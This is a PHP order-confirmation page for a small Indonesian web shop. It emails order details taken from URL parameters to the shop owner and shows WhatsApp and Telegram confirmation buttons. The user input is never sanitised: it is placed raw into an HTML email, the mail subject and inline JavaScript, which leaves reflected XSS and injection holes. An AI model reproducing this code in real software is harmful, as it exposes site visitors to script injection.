<?php
 $timestamp = date('d/m/Y h:i:s');

	$produk 	= $_GET['produk'];
	$harga 		= $_GET['harga'];
	$hp			= $_GET['hp'];
	$bayar		= $_GET['bayar'];
	$game		= $_GET['game'];
	$domain		= $_GET['domain'];

	
 $email = "storenekuzo@gmail.com";
 $result = $email; 


$subject = "$produk Bayar  $bayar";
$message = '
<center>
<div style="margin-top:10px;margin-bottom:10px;border-radius:1px;padding:5px;width:100%;background:#fff;color:white;text-align:center;">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="height: 50px; color:white;padding:0px;background:#1ed0ff; text-align:center;">
				Orderan '.$produk.'
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=left style="color:#24291D;padding:10px;background:white">
				<center><font style="color:#000; margin: 8px;">=== Orderan Boss ===</font></center>
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Yg di Beli	:</b></font> '.$produk.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Total	:</b></font> '.$harga.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Domain	:</b></font> '.$domain.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• No Wa	:</b></font> '.$hp.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Pakai	:</b></font> '.$bayar.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Waktu	:</b></font> '.$timestamp.'
			</td>
		</tr>
	</tbody>
	</table>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:#1ed0ff;color:white;text-align:center;"><font size=3 color=white><b> 2020</b></font></div>
</div>
</center>
';


$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Pembeli Gan <ytbasecamp@gmail.com>' . "\r\n";
$datamail = mail($result,$subject, $message, $headersx);
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="Description" content="SITE NEKUZO STORE">
	<meta property="og:type" content="website">
	<meta property="og:title" content="SITE NEKUZO STORE">
	<meta property="og:description" content="By NEKUZO XD">
	<meta property="og:image" content="https://i.ibb.co/Mkck4c9/20201127-010702.jpg">
	<link rel="icon" type="image/png" href="https://i.ibb.co/Mkck4c9/20201127-010702.jpg">
	<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<link rel="stylesheet" href="../../css/style.css">
<title>SITE NEKUZO STORE</title>
</head>


<body>

	<div class="box">


<div class="nav">
NEKUZO XD 
</div>
<br><br>
<div style="background:#1ed0ff; margin-top: 5%; color: #fff;">
<center>
	<i class="fa fa-html5 fa-1g" aria-hidden="true" style="margin-right: 10px;"></i>
		<span class="fa-stack fa-lg">
		<i class="fa fa-square fa-stack-2x" style="color: #000;"></i>
		<i class="fa fa-code fa-stack-1x fa-inverse"></i>
		</span>
	<i class="fa fa-css3 fa-1g" aria-hidden="true" style="margin-left: 10px;"></i>
</center>
</div>

<div class="garis-home"></div>
<div class="solusi"><i class="fa fa-check-square-o fa-2x" aria-hidden="true"></i>  Konfirmasi</div>
<center>
<div class="cart">

<div class="pilihan">Silahkan konfirmasi lewat</div>
	<button type="submit" style="border: none;" class="whatsapp2" onclick="location.href='https://api.whatsapp.com/send?phone=6285640109724&text=Pesanan:%0A%0AItem%20%20:%20%20<?php echo $produk;?>%0ADomain%20:%20%20<?php echo $domain;?>%0ATotal%20:%20%20<?php echo $harga;?>%0ABayar:%20%20<?php echo $bayar;?>%0A%0A*Segera%20selesaikan%20proses%20pembayaran%20agar%20permintaan%20di%20proses';">
	<i class="fa fa-whatsapp fa-1g" aria-hidden="true" style="color: #fff;"></i> Whatsapp
	</button>
	<button type="submit" style="border: none;" class="telegram2" onclick="location.href='https://t.me/nafis_watsiq/';">
	<i class="fa fa-telegram fa-1g" aria-hidden="true" style="color: #fff;"></i> Telegram
	</button>

<br><br><br>
<b style="color: red;">*</b>Kesalahan saat input domain bukan tanggung jawab kami bila domain tidak bisa di pakai dan tidak bisa di Reff.
<br>
<b style="color: red;">*</b>Setelah membayar harap konfirmasi lewat Whatsapp/Telegram dan mengirimkan bukti.
</div>

	</div>


<footer style="margin-top: 45%;">
	<h3> Tentang Kami</h3>
<li><a href="KOSONG"> created by NEKUZO XD</a></li>
<li><a href="LINK EMAIL"> email</a><a href="LINK EMAIL" style="color:#6e6e75;"> storenekuzo@gmail.com</a></li>
<li><a href="LINK YOUTUBE"> support</a></li>
<li><a href="LINK WEB SITE"> my blog</a></li>
<br>



<div class="barcode">
N E K U Z O X D
</div>
</footer>

	

</body>
</html>